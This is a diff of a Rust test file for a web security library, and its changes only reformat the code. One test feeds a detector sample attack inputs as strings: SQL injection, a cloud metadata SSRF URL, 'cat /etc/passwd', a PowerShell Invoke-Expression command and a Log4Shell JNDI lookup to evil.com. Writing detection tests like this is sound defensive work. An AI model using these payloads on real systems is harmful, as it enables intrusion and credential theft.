@@ -89,11 +89,11 @@ async fn test_audit_chain_hmac_integrity() {
 
 #[tokio::test]
 async fn test_csp_security_layer_middleware() {
+    use axum::Router;
     use axum::body::Body;
     use axum::http::{Request, StatusCode};
     use axum::response::Html;
     use axum::routing::get;
-    use axum::Router;
     use rullst_security::CspSecurityLayer;
     use tower::ServiceExt;
 
@@ -109,32 +109,47 @@ async fn test_csp_security_layer_middleware() {
     assert!(headers.contains_key("content-security-policy"));
     assert_eq!(headers.get("x-frame-options").unwrap(), "DENY");
     assert_eq!(headers.get("x-content-type-options").unwrap(), "nosniff");
-    assert_eq!(headers.get("referrer-policy").unwrap(), "strict-origin-when-cross-origin");
+    assert_eq!(
+        headers.get("referrer-policy").unwrap(),
+        "strict-origin-when-cross-origin"
+    );
 
-    let csp = headers.get("content-security-policy").unwrap().to_str().unwrap();
+    let csp = headers
+        .get("content-security-policy")
+        .unwrap()
+        .to_str()
+        .unwrap();
     assert!(csp.contains("default-src 'self'"));
     assert!(csp.contains("nonce-"));
 }
 
 #[tokio::test]
 async fn test_rasp_inspector_and_layer() {
+    use axum::Router;
     use axum::body::Body;
     use axum::http::{Request, StatusCode};
     use axum::response::Html;
     use axum::routing::get;
-    use axum::Router;
     use rullst_security::{RaspInspector, RaspSecurityLayer};
     use tower::ServiceExt;
 
     // Direct Inspector unit tests
-    assert!(RaspInspector::inspect_text("SELECT * FROM users WHERE id = 1 UNION SELECT 1,2,3"));
+    assert!(RaspInspector::inspect_text(
+        "SELECT * FROM users WHERE id = 1 UNION SELECT 1,2,3"
+    ));
     assert!(RaspInspector::inspect_text("' OR '1'='1"));
     assert!(RaspInspector::inspect_text("; DROP TABLE users;"));
-    assert!(RaspInspector::inspect_text("http://169.254.169.254/latest/meta-data/"));
+    assert!(RaspInspector::inspect_text(
+        "http://169.254.169.254/latest/meta-data/"
+    ));
     assert!(RaspInspector::inspect_text("cat /etc/passwd"));
-    assert!(RaspInspector::inspect_text("powershell -Command Invoke-Expression"));
+    assert!(RaspInspector::inspect_text(
+        "powershell -Command Invoke-Expression"
+    ));
     assert!(RaspInspector::inspect_text("${jndi:ldap://evil.com/a}"));
-    assert!(!RaspInspector::inspect_text("Hello John Doe! Welcome back to the application."));
+    assert!(!RaspInspector::inspect_text(
+        "Hello John Doe! Welcome back to the application."
+    ));
 
     let app = Router::new()
         .route("/api/query", get(|| async { Html("data") }))
@@ -168,7 +183,7 @@ async fn test_rasp_inspector_and_layer() {
 
 #[test]
 fn test_siem_alerting_and_cef_formatting() {
-    use rullst_security::{dispatch_siem_alert, format_cef_event, LiveSecurityEvent};
+    use rullst_security::{LiveSecurityEvent, dispatch_siem_alert, format_cef_event};
 
     let event = LiveSecurityEvent {
         event_type: "AI_PROMPT_INJECTION_SHIELDED".to_string(),
@@ -183,13 +198,21 @@ fn test_siem_alerting_and_cef_formatting() {
     assert!(cef.contains("src=203.0.113.195"));
     assert!(cef.contains("severity=9") || cef.contains("|9|"));
 
-    dispatch_siem_alert("XSS_PAYLOAD_NEUTRALIZED", "Stripped <script> tag", "198.51.100.22");
-    dispatch_siem_alert("HONEYPOT_TRAP_TRIGGERED", "Probed /wp-admin", "198.51.100.23");
+    dispatch_siem_alert(
+        "XSS_PAYLOAD_NEUTRALIZED",
+        "Stripped <script> tag",
+        "198.51.100.22",
+    );
+    dispatch_siem_alert(
+        "HONEYPOT_TRAP_TRIGGERED",
+        "Probed /wp-admin",
+        "198.51.100.23",
+    );
 }
 
 #[test]
 fn test_security_telemetry_store_all_methods() {
-    use rullst_security::{get_real_rss_memory_mb, SecurityStore, SecurityTelemetry};
+    use rullst_security::{SecurityStore, SecurityTelemetry, get_real_rss_memory_mb};
 
     let store = SecurityStore::global();
     store.inc_sanitizations();
@@ -226,12 +249,12 @@ fn test_security_telemetry_store_all_methods() {
 
 #[tokio::test]
 async fn test_rate_limit_middleware_with_axum() {
+    use axum::Router;
     use axum::body::Body;
     use axum::http::{Request, StatusCode};
     use axum::middleware;
     use axum::response::Html;
     use axum::routing::get;
-    use axum::Router;
     use rullst_security::rate_limit_middleware;
     use tower::ServiceExt;
 
@@ -251,7 +274,9 @@ async fn test_rate_limit_middleware_with_axum() {
 
 #[test]
 fn test_mfa_totp_rfc6238_generation_and_verification() {
-    use rullst_security::{build_otpauth_uri, decode_base32, generate_mfa_secret, generate_totp_code, verify_totp_code};
+    use rullst_security::{
+        build_otpauth_uri, decode_base32, generate_mfa_secret, generate_totp_code, verify_totp_code,
+    };
 
     let secret = generate_mfa_secret();
     assert_eq!(secret.len(), 32);
@@ -276,14 +301,36 @@ fn test_zero_trust_fingerprinting() {
     use rullst_security::{generate_fingerprint, verify_fingerprint};
 
     let secret = b"super-secret-zero-trust-key";
-    let fp1 = generate_fingerprint(secret, Some("Mozilla/5.0"), Some("192.168.1.50"), Some("en"));
-    let fp2 = generate_fingerprint(secret, Some("Mozilla/5.0"), Some("192.168.1.50"), Some("en"));
+    let fp1 = generate_fingerprint(
+        secret,
+        Some("Mozilla/5.0"),
+        Some("192.168.1.50"),
+        Some("en"),
+    );
+    let fp2 = generate_fingerprint(
+        secret,
+        Some("Mozilla/5.0"),
+        Some("192.168.1.50"),
+        Some("en"),
+    );
     let fp3 = generate_fingerprint(secret, Some("Mozilla/5.0"), Some("10.0.0.1"), Some("en"));
 
     assert_eq!(fp1, fp2);
     assert_ne!(fp1, fp3);
-    assert!(verify_fingerprint(&fp1, secret, Some("Mozilla/5.0"), Some("192.168.1.50"), Some("en")));
-    assert!(!verify_fingerprint(&fp1, secret, Some("Mozilla/5.0"), Some("10.0.0.1"), Some("en")));
+    assert!(verify_fingerprint(
+        &fp1,
+        secret,
+        Some("Mozilla/5.0"),
+        Some("192.168.1.50"),
+        Some("en")
+    ));
+    assert!(!verify_fingerprint(
+        &fp1,
+        secret,
+        Some("Mozilla/5.0"),
+        Some("10.0.0.1"),
+        Some("en")
+    ));
 }
 
 #[test]
@@ -323,7 +370,9 @@ fn test_login_guard_and_jail() {
 
 #[tokio::test]
 async fn test_timing_guard_synthetic_work() {
-    use rullst_security::{equalize_response_time, synthetic_argon2_cpu_work, TimingGuardConfig, TimingScope};
+    use rullst_security::{
+        TimingGuardConfig, TimingScope, equalize_response_time, synthetic_argon2_cpu_work,
+    };
     use std::time::{Duration, Instant};
 
     synthetic_argon2_cpu_work();
